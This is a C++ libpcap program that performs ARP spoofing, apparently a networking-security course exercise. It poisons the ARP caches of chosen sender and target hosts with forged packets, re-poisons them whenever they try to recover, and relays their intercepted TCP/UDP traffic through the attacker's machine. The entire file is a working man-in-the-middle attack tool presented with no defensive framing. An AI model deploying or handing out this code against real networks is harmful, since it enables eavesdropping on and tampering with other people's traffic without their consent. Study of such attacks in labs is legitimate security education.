extern "C" {
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
}
#include <pcap.h>
#include <iostream>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <map>
#include "mac.h"
#include "ip.h"
#include "arphdr.h"
#include "ethhdr.h"
#include "iphdr.h"
#include <set>

#define PACKET_SIZE (sizeof(struct EthArpPacket))

std::set<Mac> maclist;
std::map<Ip, Mac> m;

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

void usage() {
    printf("syntax: arp_spoofing <interface> <sender ip> <target ip>\n");
    printf("sample: arp_spoofing wlan0 192.168.10.2 192.168.1\n");
}

typedef struct {
    const char* dev_;
} Param;

Param param = {
        .dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc % 2 == 1) {
        usage();
        return false;
    }
    return true;
}

bool isArp(EthHdr ethhdr) {
    return ntohs(ethhdr.type_) == EthHdr::Arp;
}
bool ismypacket(ArpHdr arphdr, Ip sender_ip, Ip my_ip) {
    if (sender_ip == Ip(ntohl(arphdr.sip_))) {
        return my_ip == Ip(ntohl(arphdr.tip_));
    }
    return false;
}
void get_my_info(Ip* ip, Mac* mac) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    const char* iface = param.dev_;
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, strlen(iface));
    ifr.ifr_name[strlen(iface)] = '\0';

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    char buf_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr, buf_ip, INET_ADDRSTRLEN);
    *ip = Ip(buf_ip);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    unsigned char buf_mac[8];
    memcpy(buf_mac, ifr.ifr_hwaddr.sa_data, 6);
    *mac = Mac(buf_mac);

    close(sockfd);
}

void create_arp_request_packet(u_char* packet, Ip src_ip, Mac src_mac, Ip dst_ip, Mac dst_mac) {
    struct EthArpPacket* arp_packet = (EthArpPacket*)packet;
    EthHdr* ethhdr = &arp_packet->eth_;
    ArpHdr* arphdr = &arp_packet->arp_;

    ethhdr->dmac_ = dst_mac;
    ethhdr->smac_ = src_mac;
    ethhdr->type_ = htons(EthHdr::Arp);

    arphdr->hrd_ = htons(ArpHdr::ETHER);
    arphdr->pro_ = htons(EthHdr::Ip4);
    arphdr->hln_ = Mac::SIZE;
    arphdr->pln_ = Ip::SIZE;
    arphdr->op_ = htons(ArpHdr::Request);
    arphdr->smac_ = src_mac;
    arphdr->sip_ = htonl(src_ip);
    if (dst_mac.isBroadcast())
        arphdr->tmac_ = Mac::nullMac();
    else arphdr->tmac_ = dst_mac;
    arphdr->tip_ = htonl(dst_ip);
}

void get_sender_mac(pcap_t* pcap , Ip my_ip, Mac my_mac, Ip sender_ip, Mac* sender_mac, Ip target_ip) {

    struct pcap_pkthdr* header;
    u_char* request_packet = (u_char*)malloc(sizeof(struct EthArpPacket));
    create_arp_request_packet(request_packet, my_ip, my_mac, sender_ip, Mac::broadcastMac());
    if (pcap_sendpacket(pcap, request_packet, PACKET_SIZE) != 0) {
        fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
        exit(EXIT_FAILURE);
    }
    printf("ARP Request packet is sent\n");
    const u_char* reply_packet;
    int res;
    while ((res = pcap_next_ex(pcap, &header, &reply_packet)) >= 0) {
        if (res == 0) continue;//timout
        struct EthArpPacket* p = (struct EthArpPacket*)reply_packet;
        if (!isArp(p->eth_)) continue;
        if (ismypacket(p->arp_, sender_ip, my_ip)) {
            *sender_mac = p->arp_.smac_;
            m.insert({ sender_ip,*sender_mac });
            std::cout << "Get"<<std::string(*sender_mac) << std::endl;
            std::cout << "ARP Reply Packet is received" << std::endl;
            break;
        }

    }

}

void infect(pcap_t* pcap, Mac my_mac, Ip sender_ip, Mac sender_mac, Ip target_ip) {

    u_char* sender_infect_packet = (u_char*)malloc(sizeof(struct EthArpPacket));
    create_arp_request_packet(sender_infect_packet, target_ip, my_mac, sender_ip, sender_mac);

    if (pcap_sendpacket(pcap, sender_infect_packet, PACKET_SIZE) != 0) {
        fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
        exit(EXIT_FAILURE);
    }
    printf("ARP Spoofing Packet is successfully sent\n");
}


int main(int argc, char* argv[]) {
    if (!parse(&param, argc, argv))
        return -1;
    param.dev_ = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    struct pcap_pkthdr* header;
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }
    Mac gateway_mac;
    Ip my_ip;
    Mac my_mac;
    get_my_info(&my_ip, &my_mac);
    int cur = 2;
    std::cout << "Get"<<std::string(my_mac) << std::endl;
    while (cur < argc) {
        Ip sender_ip = Ip(argv[cur]);
        Mac sender_mac;
        Ip target_ip = Ip(argv[cur + 1]);
        Mac target_mac;

        if (m.find(sender_ip) != m.end()) {
            sender_mac = m.find(sender_ip)->second;
        }

        else {
            get_sender_mac(pcap, my_ip, my_mac, sender_ip, &sender_mac, target_ip);
        }

        infect(pcap, my_mac, sender_ip, sender_mac, target_ip);
        printf("sender is infected\n");

        if (m.find(target_ip) != m.end()) {
            sender_mac = m.find(target_ip)->second;
        }

        else {
            get_sender_mac(pcap, my_ip, my_mac, target_ip, &target_mac, sender_ip);
        }
        std::cout <<std::string(target_mac)<< std::endl;
        gateway_mac = target_mac;
        maclist.insert(sender_mac);
        maclist.insert(target_mac);
        infect(pcap, my_mac, target_ip, target_mac, sender_ip);
        printf("target is infected\n");

        cur += 2;

    }
    int res;
    const u_char* received_packet;
    while ((res = pcap_next_ex(pcap, &header, &received_packet)) >= 0) {
        if(res == 0) continue;

        EthHdr* ethhdr =(EthHdr*)received_packet;
        Mac dmac = ethhdr->dmac_;
        Mac smac = ethhdr->smac_;
        uint16_t ip_type = ntohs(ethhdr->type_);
        if((ip_type != Ipv4) && (ip_type != EthHdr::Arp)) continue;

        ArpHdr *arphdr = (ArpHdr*)(received_packet +sizeof(EthHdr));
        uint16_t hrd = ntohs(arphdr -> hrd_);
        uint16_t pro = ntohs(arphdr->pro_);
      //  Mac smac_ = arphdr->smac_;
        Ip sip_ = ntohl(arphdr->sip_);
        Ip tip = ntohl(arphdr->tip_);
        uint16_t op = htons(arphdr->op_);

        //recovery
        std::cout <<ip_type<< std::endl;
        if((dmac.isBroadcast()||(dmac == my_mac)) && (ip_type == EthHdr::Arp)){
            if(maclist.find(smac) != maclist.end()){
                if((ArpHdr::ETHER == hrd) && (EthHdr::Ip4 == pro)){
                    if(op != ArpHdr::Request) continue;
                    std::cout << "Recovery Request"<< std::endl;
                    Mac tmac = m.find(tip)->second;
                    std::cout <<std:: string(smac)<< std::endl;
                    std::cout << std::string(tmac)<< std::endl;
                    infect(pcap, my_mac, sip_, smac, tip);
                    infect(pcap, my_mac, tip, tmac, sip_);
                    std::cout << "ReInfect!!"<< std::endl;
                    continue;
                }
            }
        }

        IpHdr *iphdr = (IpHdr*)(received_packet + sizeof(EthHdr));
        Ip sip = ntohl(iphdr->sip_);
        Ip dip = ntohl(iphdr->dip_);
        uint8_t ip_p = iphdr->ip_p_;

        if((ip_p != TCP) && (ip_p !=UDP)) continue;

       // std::cout << "listening" << std::endl;
        std::cout << std::string(sip) << std::endl;
        std::cout << std::string(dip) << std::endl;
        if((m.find(sip) != m.end()) || (m.find(dip) != m.end())){
            std::cout << "!!"<< std::endl;

            if(ethhdr->smac_ != gateway_mac){
                ethhdr->dmac_ = gateway_mac;
            }
            else ethhdr->dmac_ = m.find(dip)->second;
            ethhdr->smac_ = my_mac;
            std::cout << std::string(ethhdr->smac_)<< std::endl;
            std::cout << std::string(ethhdr->dmac_)<< std::endl;
            if (pcap_sendpacket(pcap, received_packet, header->caplen) != 0) {
                fprintf(stderr, "Error sending relay packet: %s\n", pcap_geterr(pcap));
                exit(EXIT_FAILURE);
            }

            std::cout << "Sending relay packet is successfully send" << std::endl;
        }

    }


    pcap_close(pcap);
    return 0;
}
